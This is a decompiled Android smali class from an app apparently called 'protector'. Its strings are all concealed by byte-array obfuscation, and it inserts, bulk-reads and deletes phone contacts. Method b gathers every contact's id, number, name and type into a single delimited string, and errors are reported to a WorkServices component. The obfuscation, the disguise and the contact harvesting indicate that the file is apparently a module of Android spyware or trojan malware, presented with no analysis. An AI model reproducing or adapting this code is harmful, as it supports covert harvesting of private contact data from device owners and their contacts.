.class public abstract Lcom/icontrol/protector/c;
.super Ljava/lang/Object;
.source "SourceFile"


# direct methods
.method public static a(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Z
    .locals 9

    .line 1
    new-instance v0, Ljava/util/ArrayList;

    invoke-direct {v0}, Ljava/util/ArrayList;-><init>()V

    sget-object v1, Landroid/provider/ContactsContract$RawContacts;->CONTENT_URI:Landroid/net/Uri;

    invoke-static {v1}, Landroid/content/ContentProviderOperation;->newInsert(Landroid/net/Uri;)Landroid/content/ContentProviderOperation$Builder;

    move-result-object v1

    const/16 v2, 0xc

    new-array v3, v2, [B

    fill-array-data v3, :array_0

    const/16 v4, 0x8

    new-array v5, v4, [B

    fill-array-data v5, :array_1

    invoke-static {v3, v5}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v3

    const/4 v5, 0x0

    invoke-virtual {v1, v3, v5}, Landroid/content/ContentProviderOperation$Builder;->withValue(Ljava/lang/String;Ljava/lang/Object;)Landroid/content/ContentProviderOperation$Builder;

    move-result-object v1

    new-array v2, v2, [B

    fill-array-data v2, :array_2

    new-array v3, v4, [B

    fill-array-data v3, :array_3

    invoke-static {v2, v3}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2, v5}, Landroid/content/ContentProviderOperation$Builder;->withValue(Ljava/lang/String;Ljava/lang/Object;)Landroid/content/ContentProviderOperation$Builder;

    move-result-object v1

    invoke-virtual {v1}, Landroid/content/ContentProviderOperation$Builder;->build()Landroid/content/ContentProviderOperation;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/util/ArrayList;->add(Ljava/lang/Object;)Z

    const/16 v1, 0xe

    const/4 v2, 0x5

    const/4 v3, 0x0

    if-eqz p1, :cond_0

    sget-object v5, Landroid/provider/ContactsContract$Data;->CONTENT_URI:Landroid/net/Uri;

    invoke-static {v5}, Landroid/content/ContentProviderOperation;->newInsert(Landroid/net/Uri;)Landroid/content/ContentProviderOperation$Builder;

    move-result-object v5

    new-array v6, v1, [B

    fill-array-data v6, :array_4

    new-array v7, v4, [B

    fill-array-data v7, :array_5

    invoke-static {v6, v7}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v5, v6, v3}, Landroid/content/ContentProviderOperation$Builder;->withValueBackReference(Ljava/lang/String;I)Landroid/content/ContentProviderOperation$Builder;

    move-result-object v5

    new-array v6, v4, [B

    fill-array-data v6, :array_6

    new-array v7, v4, [B

    fill-array-data v7, :array_7

    invoke-static {v6, v7}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v6

    const/16 v7, 0x1c

    new-array v7, v7, [B

    fill-array-data v7, :array_8

    new-array v8, v4, [B

    fill-array-data v8, :array_9

    invoke-static {v7, v8}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v5, v6, v7}, Landroid/content/ContentProviderOperation$Builder;->withValue(Ljava/lang/String;Ljava/lang/Object;)Landroid/content/ContentProviderOperation$Builder;

    move-result-object v5

    new-array v6, v2, [B

    fill-array-data v6, :array_a

    new-array v7, v4, [B

    fill-array-data v7, :array_b

    invoke-static {v6, v7}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v5, v6, p1}, Landroid/content/ContentProviderOperation$Builder;->withValue(Ljava/lang/String;Ljava/lang/Object;)Landroid/content/ContentProviderOperation$Builder;

    move-result-object p1

    invoke-virtual {p1}, Landroid/content/ContentProviderOperation$Builder;->build()Landroid/content/ContentProviderOperation;

    move-result-object p1

    invoke-virtual {v0, p1}, Ljava/util/ArrayList;->add(Ljava/lang/Object;)Z

    :cond_0
    if-eqz p2, :cond_1

    sget-object p1, Landroid/provider/ContactsContract$Data;->CONTENT_URI:Landroid/net/Uri;

    invoke-static {p1}, Landroid/content/ContentProviderOperation;->newInsert(Landroid/net/Uri;)Landroid/content/ContentProviderOperation$Builder;

    move-result-object p1

    new-array v1, v1, [B

    fill-array-data v1, :array_c

    new-array v5, v4, [B

    fill-array-data v5, :array_d

    invoke-static {v1, v5}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {p1, v1, v3}, Landroid/content/ContentProviderOperation$Builder;->withValueBackReference(Ljava/lang/String;I)Landroid/content/ContentProviderOperation$Builder;

    move-result-object p1

    new-array v1, v4, [B

    fill-array-data v1, :array_e

    new-array v5, v4, [B

    fill-array-data v5, :array_f

    invoke-static {v1, v5}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v1

    const/16 v5, 0x20

    new-array v5, v5, [B

    fill-array-data v5, :array_10

    new-array v6, v4, [B

    fill-array-data v6, :array_11

    invoke-static {v5, v6}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {p1, v1, v5}, Landroid/content/ContentProviderOperation$Builder;->withValue(Ljava/lang/String;Ljava/lang/Object;)Landroid/content/ContentProviderOperation$Builder;

    move-result-object p1

    new-array v1, v2, [B

    fill-array-data v1, :array_12

    new-array v5, v4, [B

    fill-array-data v5, :array_13

    invoke-static {v1, v5}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {p1, v1, p2}, Landroid/content/ContentProviderOperation$Builder;->withValue(Ljava/lang/String;Ljava/lang/Object;)Landroid/content/ContentProviderOperation$Builder;

    move-result-object p1

    new-array p2, v2, [B

    fill-array-data p2, :array_14

    new-array v1, v4, [B

    fill-array-data v1, :array_15

    invoke-static {p2, v1}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object p2

    const/4 v1, 0x2

    invoke-static {v1}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v1

    invoke-virtual {p1, p2, v1}, Landroid/content/ContentProviderOperation$Builder;->withValue(Ljava/lang/String;Ljava/lang/Object;)Landroid/content/ContentProviderOperation$Builder;

    move-result-object p1

    invoke-virtual {p1}, Landroid/content/ContentProviderOperation$Builder;->build()Landroid/content/ContentProviderOperation;

    move-result-object p1

    invoke-virtual {v0, p1}, Ljava/util/ArrayList;->add(Ljava/lang/Object;)Z

    :cond_1
    :try_start_0
    invoke-virtual {p0}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object p1

    const/16 p2, 0x14

    new-array p2, p2, [B

    fill-array-data p2, :array_16

    new-array v1, v4, [B

    fill-array-data v1, :array_17

    invoke-static {p2, v1}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object p2

    invoke-virtual {p1, p2, v0}, Landroid/content/ContentResolver;->applyBatch(Ljava/lang/String;Ljava/util/ArrayList;)[Landroid/content/ContentProviderResult;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    const/4 p0, 0x1

    return p0

    :catch_0
    move-exception p1

    const/16 p2, 0xb

    new-array p2, p2, [B

    fill-array-data p2, :array_18

    new-array v0, v4, [B

    fill-array-data v0, :array_19

    invoke-static {p2, v0}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object p2

    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    const/4 v1, 0x6

    new-array v1, v1, [B

    fill-array-data v1, :array_1a

    new-array v2, v4, [B

    fill-array-data v2, :array_1b

    invoke-static {v1, v2}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p1}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    move-result-object p1

    invoke-virtual {v0, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    invoke-static {p0, p2, p1}, Lcom/icontrol/protector/WorkServices$d;->a(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    return v3

    :array_0
    .array-data 1
        0x36t
        0x38t
        0x20t
        -0x25t
        -0x14t
        0x10t
        -0x77t
        -0x57t
        0x23t
        0x22t
        0x33t
        -0x2ft
    .end array-data

    :array_1
    .array-data 1
        0x57t
        0x5bt
        0x43t
        -0x4ct
        -0x67t
        0x7et
        -0x3t
        -0xat
    .end array-data

    :array_2
    .array-data 1
        0xbt
        -0x6dt
        0x5at
        -0x11t
        -0x13t
        -0x51t
        0x66t
        -0x35t
        0x4t
        -0x6ft
        0x54t
        -0x1bt
    .end array-data

    :array_3
    .array-data 1
        0x6at
        -0x10t
        0x39t
        -0x80t
        -0x68t
        -0x3ft
        0x12t
        -0x6ct
    .end array-data

    :array_4
    .array-data 1
        -0x2ct
        0x7ct
        -0x24t
        -0x15t
        -0x29t
        -0x38t
        0x52t
        0x6bt
        -0x39t
        0x7et
        -0x21t
        -0x15t
        -0x23t
        -0x3dt
    .end array-data

    nop

    :array_5
    .array-data 1
        -0x5at
        0x1dt
        -0x55t
        -0x4ct
        -0x4ct
        -0x59t
        0x3ct
        0x1ft
    .end array-data

    :array_6
    .array-data 1
        -0x77t
        -0x4at
        -0x1ft
        -0x56t
        -0x5et
        0x38t
        -0x80t
        -0x71t
    .end array-data

    :array_7
    .array-data 1
        -0x1ct
        -0x21t
        -0x74t
        -0x31t
        -0x2at
        0x41t
        -0x10t
        -0x16t
    .end array-data

    :array_8
    .array-data 1
        -0x1t
        -0x45t
        -0x63t
        -0x2bt
        0x5ft
        -0x52t
        -0x7ct
        -0x13t
        -0x1at
        -0x44t
        -0x63t
        -0x2bt
        0x5dt
        -0x4bt
        -0x6et
        -0x14t
        -0x1at
        -0x59t
        -0x29t
        -0x6et
        0x4at
        -0x5bt
        -0x73t
        -0x50t
        -0x19t
        -0x4ct
        -0x6ct
        -0x62t
    .end array-data

    :array_9
    .array-data 1
        -0x77t
        -0x2bt
        -0x7t
        -0x5t
        0x3et
        -0x40t
        -0x20t
        -0x61t
    .end array-data

    :array_a
    .array-data 1
        0x55t
        -0x2bt
        0x5et
        0x6et
        0x9t
    .end array-data

    nop

    :array_b
    .array-data 1
        0x31t
        -0x4ct
        0x2at
        0xft
        0x38t
        -0x19t
        0x63t
        -0x2ft
    .end array-data

    :array_c
    .array-data 1
        -0x73t
        -0x69t
        -0x17t
        -0x6bt
        0x43t
        0x4t
        -0x2dt
        0x46t
        -0x62t
        -0x6bt
        -0x16t
        -0x6bt
        0x49t
        0xft
    .end array-data

    nop

    :array_d
    .array-data 1
        -0x1t
        -0xat
        -0x62t
        -0x36t
        0x20t
        0x6bt
        -0x43t
        0x32t
    .end array-data

    :array_e
    .array-data 1
        0x3bt
        -0x29t
        -0x17t
        0x7et
        -0x5ft
        -0xat
        -0x32t
        0x7et
    .end array-data

    :array_f
    .array-data 1
        0x56t
        -0x42t
        -0x7ct
        0x1bt
        -0x2bt
        -0x71t
        -0x42t
        0x1bt
    .end array-data

    :array_10
    .array-data 1
        0x1ft
        -0x64t
        -0x2bt
        -0x4et
        -0x1bt
        0x7ct
        -0x48t
        0x77t
        0x6t
        -0x65t
        -0x2bt
        -0x4et
        -0x19t
        0x67t
        -0x52t
        0x76t
        0x6t
        -0x80t
        -0x61t
        -0xbt
        -0x10t
        0x77t
        -0x4ft
        0x2at
        0x19t
        -0x66t
        -0x22t
        -0xet
        -0x1ft
        0x4dt
        -0x56t
        0x37t
    .end array-data

    :array_11
    .array-data 1
        0x69t
        -0xet
        -0x4ft
        -0x64t
        -0x7ct
        0x12t
        -0x24t
        0x5t
    .end array-data

    :array_12
    .array-data 1
        0x36t
        -0x24t
        0x3bt
        0x7at
        0x6et
    .end array-data

    nop

    :array_13
    .array-data 1
        0x52t
        -0x43t
        0x4ft
        0x1bt
        0x5ft
        -0x8t
        -0x6t
        0x7ft
    .end array-data

    :array_14
    .array-data 1
        -0x1ct
        -0x4et
        0x37t
        -0x50t
        0x8t
    .end array-data

    nop

    :array_15
    .array-data 1
        -0x80t
        -0x2dt
        0x43t
        -0x2ft
        0x3at
        0x40t
        -0x80t
        -0x5at
    .end array-data

    :array_16
    .array-data 1
        -0x2ct
        -0x20t
        0x42t
        0x4bt
        -0x63t
        -0x7at
        0x14t
        -0x3ft
        -0x28t
        -0x1at
        0x4bt
        0x4bt
        -0x61t
        -0x79t
        0x1et
        -0x39t
        -0x2at
        -0x14t
        0x5bt
        0x16t
    .end array-data

    :array_17
    .array-data 1
        -0x49t
        -0x71t
        0x2ft
        0x65t
        -0x4t
        -0x18t
        0x70t
        -0x4dt
    .end array-data

    :array_18
    .array-data 1
        -0x3t
        -0x2et
        -0x6at
        -0x6ft
        0x10t
        -0x5bt
        0x65t
        -0x74t
        -0x23t
        -0x2bt
        -0x7at
    .end array-data

    :array_19
    .array-data 1
        -0x44t
        -0x4at
        -0xet
        -0x4ft
        0x53t
        -0x36t
        0xbt
        -0x8t
    .end array-data

    :array_1a
    .array-data 1
        0x7dt
        -0x1at
        -0x13t
        -0x55t
        -0x5bt
        0x2bt
    .end array-data

    nop

    :array_1b
    .array-data 1
        0x38t
        -0x6ct
        -0x61t
        -0x3ct
        -0x29t
        0x11t
        0x6ct
        -0x25t
    .end array-data
.end method

.method public static b(Landroid/content/Context;)Ljava/lang/String;
    .locals 9

    .line 1
    :try_start_0
    new-instance v0, Ljava/lang/StringBuffer;

    invoke-direct {v0}, Ljava/lang/StringBuffer;-><init>()V

    invoke-virtual {p0}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v1

    sget-object v2, Landroid/provider/ContactsContract$Data;->CONTENT_URI:Landroid/net/Uri;

    const/4 v3, 0x0

    const/16 p0, 0x32

    new-array p0, p0, [B

    fill-array-data p0, :array_0

    const/16 v7, 0x8

    new-array v4, v7, [B

    fill-array-data v4, :array_1

    invoke-static {p0, v4}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v4

    const/4 p0, 0x2

    new-array v5, p0, [Ljava/lang/String;

    const/16 p0, 0x20

    new-array v6, p0, [B

    fill-array-data v6, :array_2

    new-array v8, v7, [B

    fill-array-data v8, :array_3

    invoke-static {v6, v8}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v6

    const/4 v8, 0x0

    aput-object v6, v5, v8

    new-array p0, p0, [B

    fill-array-data p0, :array_4

    new-array v6, v7, [B

    fill-array-data v6, :array_5

    invoke-static {p0, v6}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object p0

    const/4 v6, 0x1

    aput-object p0, v5, v6

    const/16 p0, 0xa

    new-array v6, p0, [B

    fill-array-data v6, :array_6

    new-array v8, v7, [B

    fill-array-data v8, :array_7

    invoke-static {v6, v8}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v6

    invoke-virtual/range {v1 .. v6}, Landroid/content/ContentResolver;->query(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;

    move-result-object v1

    :cond_0
    :goto_0
    invoke-interface {v1}, Landroid/database/Cursor;->moveToNext()Z

    move-result v2

    if-eqz v2, :cond_1

    const/4 v2, 0x5

    new-array v2, v2, [B

    fill-array-data v2, :array_8

    new-array v3, v7, [B

    fill-array-data v3, :array_9

    invoke-static {v2, v3}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v2

    invoke-interface {v1, v2}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v2

    invoke-interface {v1, v2}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/String;->trim()Ljava/lang/String;

    move-result-object v2

    if-eqz v2, :cond_0

    invoke-virtual {v2}, Ljava/lang/String;->isEmpty()Z

    move-result v3

    if-nez v3, :cond_0

    const/4 v3, 0x4

    new-array v3, v3, [B

    fill-array-data v3, :array_a

    new-array v4, v7, [B

    fill-array-data v4, :array_b

    invoke-static {v3, v4}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-nez v3, :cond_0

    invoke-virtual {v2}, Ljava/lang/String;->length()I

    move-result v3

    if-lez v3, :cond_0

    const/16 v3, 0xc

    new-array v3, v3, [B

    fill-array-data v3, :array_c

    new-array v4, v7, [B

    fill-array-data v4, :array_d

    invoke-static {v3, v4}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v3

    invoke-interface {v1, v3}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v3

    invoke-interface {v1, v3}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v3

    const/16 v4, 0x19

    new-array v4, v4, [B

    fill-array-data v4, :array_e

    new-array v5, v7, [B

    fill-array-data v5, :array_f

    invoke-static {v4, v5}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v4

    invoke-interface {v1, v4}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v4

    invoke-interface {v1, v4}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v4

    new-array v5, p0, [B

    fill-array-data v5, :array_10

    new-array v6, v7, [B

    fill-array-data v6, :array_11

    invoke-static {v5, v6}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v5

    invoke-interface {v1, v5}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v5

    invoke-interface {v1, v5}, Landroid/database/Cursor;->getInt(I)I

    move-result v5

    new-instance v6, Ljava/lang/StringBuilder;

    invoke-direct {v6}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v6, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-object v3, Lntidisestablish/neumonoul/floccinaucinih/ab;->j:Ljava/lang/String;

    invoke-virtual {v6, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v6, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-object v2, Lntidisestablish/neumonoul/floccinaucinih/ab;->j:Ljava/lang/String;

    invoke-virtual {v6, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v6, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-object v2, Lntidisestablish/neumonoul/floccinaucinih/ab;->j:Ljava/lang/String;

    invoke-virtual {v6, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v6, v5}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    sget-object v2, Lntidisestablish/neumonoul/floccinaucinih/ab;->i:Ljava/lang/String;

    invoke-virtual {v6, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v6}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v0, v2}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    goto/16 :goto_0

    :cond_1
    invoke-interface {v1}, Landroid/database/Cursor;->close()V

    invoke-virtual {v0}, Ljava/lang/StringBuffer;->toString()Ljava/lang/String;

    move-result-object p0
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    return-object p0

    :catch_0
    const/4 p0, 0x0

    return-object p0

    nop

    :array_0
    .array-data 1
        0x62t
        -0x51t
        0x38t
        0x78t
        -0x37t
        0x8t
        0x19t
        0x2ct
        0x6ft
        -0x6ft
        0x25t
        0x52t
        -0x2ct
        0x2t
        0x13t
        0x30t
        0x2bt
        -0xdt
        0x7bt
        0x7t
        -0x8t
        0x2et
        0x32t
        0x62t
        0x22t
        -0x5dt
        0x22t
        0x4at
        -0x24t
        0x14t
        0xft
        0x32t
        0x6ft
        -0xdt
        0x74t
        0x7t
        -0xat
        0x32t
        0x56t
        0x2ft
        0x63t
        -0x5dt
        0x2et
        0x53t
        -0x40t
        0x10t
        0x13t
        0x7ft
        0x35t
        -0x19t
    .end array-data

    nop

    :array_1
    .array-data 1
        0xat
        -0x32t
        0x4bt
        0x27t
        -0x47t
        0x60t
        0x76t
        0x42t
    .end array-data

    :array_2
    .array-data 1
        0x6ft
        -0x63t
        -0x5bt
        0x5dt
        0x3ct
        0x71t
        -0x7et
        -0xat
        0x76t
        -0x66t
        -0x5bt
        0x5dt
        0x3et
        0x6at
        -0x6ct
        -0x9t
        0x76t
        -0x7ft
        -0x11t
        0x1at
        0x29t
        0x7at
        -0x75t
        -0x55t
        0x7ct
        -0x62t
        -0x60t
        0x1at
        0x31t
        0x40t
        -0x70t
        -0x4at
    .end array-data

    :array_3
    .array-data 1
        0x19t
        -0xdt
        -0x3ft
        0x73t
        0x5dt
        0x1ft
        -0x1at
        -0x7ct
    .end array-data

    :array_4
    .array-data 1
        0x45t
        0xbt
        0x3ct
        -0x66t
        0x49t
        -0x47t
        0x77t
        0x2ft
        0x5ct
        0xct
        0x3ct
        -0x66t
        0x4bt
        -0x5et
        0x61t
        0x2et
        0x5ct
        0x17t
        0x76t
        -0x23t
        0x5ct
        -0x4et
        0x7et
        0x72t
        0x43t
        0xdt
        0x37t
        -0x26t
        0x4dt
        -0x78t
        0x65t
        0x6ft
    .end array-data

    :array_5
    .array-data 1
        0x33t
        0x65t
        0x58t
        -0x4ct
        0x28t
        -0x29t
        0x13t
        0x5dt
    .end array-data

    :array_6
    .array-data 1
        0x63t
        0x25t
        0x2ct
        0x49t
        0xbt
        -0x35t
        -0x1bt
        -0x4t
        0x69t
        0x2et
    .end array-data

    nop

    :array_7
    .array-data 1
        0x0t
        0x4at
        0x42t
        0x3dt
        0x6at
        -0x58t
        -0x6ft
        -0x5dt
    .end array-data

    :array_8
    .array-data 1
        0x68t
        -0xft
        0x1ct
        -0x66t
        -0x5bt
    .end array-data

    nop

    :array_9
    .array-data 1
        0xct
        -0x70t
        0x68t
        -0x5t
        -0x6ct
        -0x7bt
        -0x7ct
        -0x2ft
    .end array-data

    :array_a
    .array-data 1
        0x29t
        -0x76t
        0x7ft
        0x61t
    .end array-data

    :array_b
    .array-data 1
        0x47t
        -0x1t
        0x13t
        0xdt
        -0x25t
        0x27t
        -0xdt
        0x7et
    .end array-data

    :array_c
    .array-data 1
        0x12t
        0x68t
        -0x33t
        0x5ft
        0x16t
        0x68t
        0x3t
        -0x7ct
        0x18t
        0x60t
        -0x2dt
        0x4at
    .end array-data

    :array_d
    .array-data 1
        0x76t
        0x1t
        -0x42t
        0x2ft
        0x7at
        0x9t
        0x7at
        -0x25t
    .end array-data

    :array_e
    .array-data 1
        -0x25t
        -0x3ct
        0x49t
        0x4at
        -0x1dt
        0x5ct
        0x1bt
        0x11t
        -0x32t
        -0x22t
        0x5at
        0x40t
        -0x37t
        0x53t
        0x1t
        0x2at
        -0x1bt
        -0x3dt
        0x4bt
        0x51t
        -0x9t
        0x6dt
        0x1ct
        0x2bt
        -0x32t
    .end array-data

    nop

    :array_f
    .array-data 1
        -0x46t
        -0x59t
        0x2at
        0x25t
        -0x6at
        0x32t
        0x6ft
        0x4et
    .end array-data

    :array_10
    .array-data 1
        0x6ft
        -0x17t
        -0x80t
        0x2ft
        -0x1dt
        -0x59t
        0x1t
        -0x1ft
        0x65t
        -0x1et
    .end array-data

    nop

    :array_11
    .array-data 1
        0xct
        -0x7at
        -0x12t
        0x5bt
        -0x7et
        -0x3ct
        0x75t
        -0x42t
    .end array-data
.end method

.method public static c(Landroid/content/Context;Ljava/lang/String;)V
    .locals 5

    .line 1
    new-instance v0, Ljava/util/ArrayList;

    invoke-direct {v0}, Ljava/util/ArrayList;-><init>()V

    invoke-virtual {p0}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object p0

    sget-object v1, Landroid/provider/ContactsContract$RawContacts;->CONTENT_URI:Landroid/net/Uri;

    invoke-static {v1}, Landroid/content/ContentProviderOperation;->newDelete(Landroid/net/Uri;)Landroid/content/ContentProviderOperation$Builder;

    move-result-object v1

    const/16 v2, 0xe

    new-array v2, v2, [B

    fill-array-data v2, :array_0

    const/16 v3, 0x8

    new-array v4, v3, [B

    fill-array-data v4, :array_1

    invoke-static {v2, v4}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v2

    filled-new-array {p1}, [Ljava/lang/String;

    move-result-object p1

    invoke-virtual {v1, v2, p1}, Landroid/content/ContentProviderOperation$Builder;->withSelection(Ljava/lang/String;[Ljava/lang/String;)Landroid/content/ContentProviderOperation$Builder;

    move-result-object p1

    invoke-virtual {p1}, Landroid/content/ContentProviderOperation$Builder;->build()Landroid/content/ContentProviderOperation;

    move-result-object p1

    invoke-virtual {v0, p1}, Ljava/util/ArrayList;->add(Ljava/lang/Object;)Z

    const/16 p1, 0x14

    :try_start_0
    new-array p1, p1, [B

    fill-array-data p1, :array_2

    new-array v1, v3, [B

    fill-array-data v1, :array_3

    invoke-static {p1, v1}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object p1

    invoke-virtual {p0, p1, v0}, Landroid/content/ContentResolver;->applyBatch(Ljava/lang/String;Ljava/util/ArrayList;)[Landroid/content/ContentProviderResult;
    :try_end_0
    .catch Landroid/os/RemoteException; {:try_start_0 .. :try_end_0} :catch_1
    .catch Landroid/content/OperationApplicationException; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_1

    :catch_0
    move-exception p0

    goto :goto_0

    :catch_1
    move-exception p0

    :goto_0
    invoke-virtual {p0}, Ljava/lang/Throwable;->printStackTrace()V

    :goto_1
    invoke-virtual {v0}, Ljava/util/ArrayList;->clear()V

    return-void

    :array_0
    .array-data 1
        -0x49t
        0x32t
        -0x67t
        -0x5et
        -0x6dt
        0x65t
        0x34t
        -0x14t
        -0x43t
        0x39t
        -0x29t
        -0x15t
        -0x2et
        0x39t
    .end array-data

    nop

    :array_1
    .array-data 1
        -0x2ct
        0x5dt
        -0x9t
        -0x2at
        -0xet
        0x6t
        0x40t
        -0x4dt
    .end array-data

    :array_2
    .array-data 1
        -0x17t
        0x16t
        -0x29t
        -0x2ft
        -0x36t
        -0x3dt
        -0x80t
        -0x7dt
        -0x1bt
        0x10t
        -0x22t
        -0x2ft
        -0x38t
        -0x3et
        -0x76t
        -0x7bt
        -0x15t
        0x1at
        -0x32t
        -0x74t
    .end array-data

    :array_3
    .array-data 1
        -0x76t
        0x79t
        -0x46t
        -0x1t
        -0x55t
        -0x53t
        -0x1ct
        -0xft
    .end array-data
.end method
